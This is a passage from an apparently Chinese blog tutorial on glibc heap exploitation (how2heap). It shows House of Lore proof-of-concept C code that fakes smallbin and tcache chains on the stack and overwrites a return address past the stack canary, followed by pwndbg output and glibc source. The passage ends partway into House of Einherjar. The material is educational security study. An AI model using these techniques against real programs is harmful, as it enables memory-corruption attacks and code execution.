nb);</span><br><span class="line">		<span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">		alloc_perturb (p, bytes);</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="house-of-lore-glibc2-34"><a href="#house-of-lore-glibc2-34" class="headerlink" title="house_of_lore_glibc2.34"></a>house_of_lore_glibc2.34</h2><h3 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h3><blockquote>
<p>Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.</p>
</blockquote>
<p>这个攻击针对small bin，通过修改small bin 中 chunk 的 bk 指针，来申请一个任意的地址。有tcache bin 也没有关系，填充即可。<br>申请small bin chunk的时候，只检查了bk指针，所以我们伪造的时候覆盖掉bk指针即可。</p>
<h3 id="POC-11"><a href="#POC-11" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = "malloc(): smallbin double linked list corrupted";</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating dummy chunks for using up tcache later\n"</span>);</span><br><span class="line">  <span class="keyword">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake free-list on the stack\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake free-list at %p\n"</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></span><br><span class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></span><br><span class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></span><br><span class="line">         <span class="string">"chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "</span></span><br><span class="line">          <span class="string">"introduced by smallbin-to-tcache mechanism\n"</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="keyword">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">         <span class="string">"the small one during the free()\n"</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing dummy chunk\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now take all dummies chunk in tcache out\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(0x100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> offset = (<span class="keyword">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="keyword">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="keyword">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="keyword">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *x[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">size_t</span>* stack1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">size_t</span>* stack2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">void</span>* fake_chunks[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">size_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line">  stack1[<span class="number">2</span>] = victim_chunk;    <span class="comment">// set fwd</span></span><br><span class="line">  stack1[<span class="number">3</span>] = (<span class="keyword">size_t</span>*)stack2; <span class="comment">// set bk</span></span><br><span class="line">  stack2[<span class="number">2</span>] = (<span class="keyword">size_t</span>*)stack1;            <span class="comment">// set fwd</span></span><br><span class="line">  stack2[<span class="number">3</span>] = (<span class="keyword">size_t</span> *)fake_chunks[<span class="number">0</span>];   <span class="comment">// set bk</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)  fake_chunks[i][<span class="number">3</span>] = fake_chunks[i+<span class="number">1</span>];</span><br><span class="line">  fake_chunks[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">  <span class="built_in">free</span>(victim); <span class="comment">//go into unsorted bin,missing next line will be difficult to by pass line:3887</span></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x200</span>); <span class="comment">// kick into small bin will be easy to trigger</span></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">size_t</span>)stack1; <span class="comment">// poison victim-&gt;bk to stack</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//trigger and stash others into tcache(including fack_chunks)</span></span><br><span class="line">  <span class="keyword">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">// cash out the fake_chunks[4]</span></span><br><span class="line">  assert(p4 - <span class="number">0x10</span> == &amp;fake_chunks[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-9"><a href="#pwndbg调试-9" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>由于有了 tcache bin，一条 tcache bin 链可以装7个 chunk，所以需要申请再释放7块内存。存放在x[7]数组中。<br>然后申请了两个缓冲的fake_chunk——stack1、stack2，和用来存放fake_chunk的fake_chunks数组。<br>令 stack1的fd 指针指向 victim，bk指针指向 stack2，stack2 的 fd 指针指向 stack1，bk指针指向fake_chunks串。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p &amp;stack1</span><br><span class="line"><span class="meta">$</span>2 = (size_t *(*)[4]) 0x7fffffffd840</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p &amp;stack2</span><br><span class="line"><span class="meta">$</span>3 = (size_t *(*)[4]) 0x7fffffffd860</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx stack1</span><br><span class="line">0x7fffffffd840: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fffffffd850: 0x0000555555757290      0x00007fffffffd860</span><br><span class="line">0x7fffffffd860: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fffffffd870: 0x00007fffffffd840      0x00007fffffffd8c0</span><br></pre></td></tr></table></figure></p>
<p>接下来伪造 fake_chunks 串，令他们的每一个 bk 指针都指向他们的下一个 chunk。<br><code>for(int i=0; i&lt;6; i++)  fake_chunks[i][3] = fake_chunks[i+1];</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p/x fake_chunks</span><br><span class="line"><span class="meta">$</span>5 = &#123;&#123;0x40, 0x10, 0x40, 0x7fffffffd8e0&#125;, &#123;0x8000, 0x38000000380, 0x800, 0x7fffffffd900&#125;, &#123;0x800000, 0xffffffffffffffff, 0x0, 0x7fffffffd920&#125;, &#123;0xffffffffffffffff, 0x0, 0x800000, 0x7fffffffd940&#125;, &#123;0x0, 0x600000, 0xffffffffffffffff, 0x7fffffffd960&#125;, &#123;0x1000, 0x0, 0x0, 0x7fffffffd980&#125;, &#123;0x0, 0x0, 0x0, 0x0&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>后面这两句循环在填充tcache bin，填满tcache bin才会将 victim 放入 unsorted bin。<br>申请一个0x200（大于 victim ，把 victim 从 unsorted bin中取出放入 small bin。）的chunk。victim 进入 small bin之后，修改 bk 指针指向 stack1，和后面的所有 fa_ke_chunk 串联起来。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/lore_bin1.png" alt><br>poison victim_bk之后：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/lore_bin2.png" alt><br>这时候再malloc 7块内存清空 tcache bin。然后重点！这时候再从 small bin 中申请一块内存的时候（small bin 双向链表遵循先进先出原则，新chunk采取头插法进入small bin链表，取出的时候从链表尾取 chunk），会把这块chunk 后的 chunk 截断整段链入 tcache bin。详情可以看前面 fastbin_reverse_into_tcache。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">stash them in the tcache.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">	mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	<span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">	&amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			bck = tc_victim-&gt;bk;</span><br><span class="line">			set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">			<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">				set_non_main_arena (tc_victim);</span><br><span class="line">			bin-&gt;bk = bck;</span><br><span class="line">			bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">			tcache_put (tc_victim, tc_idx);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2022/04/18/how2heap深入浅出学习堆利用/lore_bin3.png" alt><br>这里注意下，取出small bin chunk放入 tcache bin中的时候，判断方法是<code>tc_victim = last (bin)) != bin</code>，也就是每次都从 small bin 链表尾取一个chunk判断是不是等于表头，然后再使用头插法存入 tcache bin，直到放满 tcache bin。<br>这样的话，chunks 在放入 tcache bin 后的排序与他们在small bins中的排序是一样的。这点可以与fastbin_reverse_into_tcache 这个例子作比较。<br>在 fastbin_reverse_into_tcache 中，如果tcache bin为空，那么从 fastbin 取出一个chunk 后也会将fast bin中剩余chunk 放入tcache bin。但是这里是从fast bin的头结点开始取chunk，使用头插法插入 tcache bin。这样放入tcache bin 后的chunk排序就会与他们在fast bin相反，所以叫reverse。<br>这时候bk链现状：<br>注意是bk，bk指向前一个 chunk。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">取出victim前的small bin：</span><br><span class="line">fake_chunks[6] --&gt; fake_chunks[5] --&gt; fake_chunks[4] --&gt; fake_chunks[3] --&gt; fake_chunks[2] --&gt; fake_chunks[1] --&gt; fake_chunks[0] --&gt; stack2 --&gt; stack1 --&gt; victim</span><br><span class="line">取出victim后的small bin 与 tcache bin：</span><br><span class="line">fake_chunks[6] --&gt; fake_chunks[5]</span><br><span class="line"></span><br><span class="line">fake_chunks[4] --&gt; fake_chunks[3] --&gt; fake_chunks[2] --&gt; fake_chunks[1] --&gt; fake_chunks[0] --&gt; stack2 --&gt; stack1</span><br></pre></td></tr></table></figure>
<p>再次申请的时候，就是从tcache bin中取 chunk。tcache bin中取 chunk原则是先从头结点取，先进后出原则，取出fake_chunks[4]。</p>
<h2 id="house-of-einherjar-glibc2-34"><a href="#house-of-einherjar-glibc2-34" class="headerlink" title="house_of_einherjar_glibc2.34"></a>house_of_einherjar_glibc2.34</h2><h3 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h3><p>house of einherjar 和 poison null byte 类似。通过溢出覆盖物理相邻高地址的 prev_size 和 prev_inuse 位，那么 free 的时候就会触发合并与unlink，而合并的 size 是由我们自己控制的。也就是说如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p>
<h3 id="POC-12"><a href="#POC-12" class="headerlink" title="POC"></a>POC</h3><p>how2heap源码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 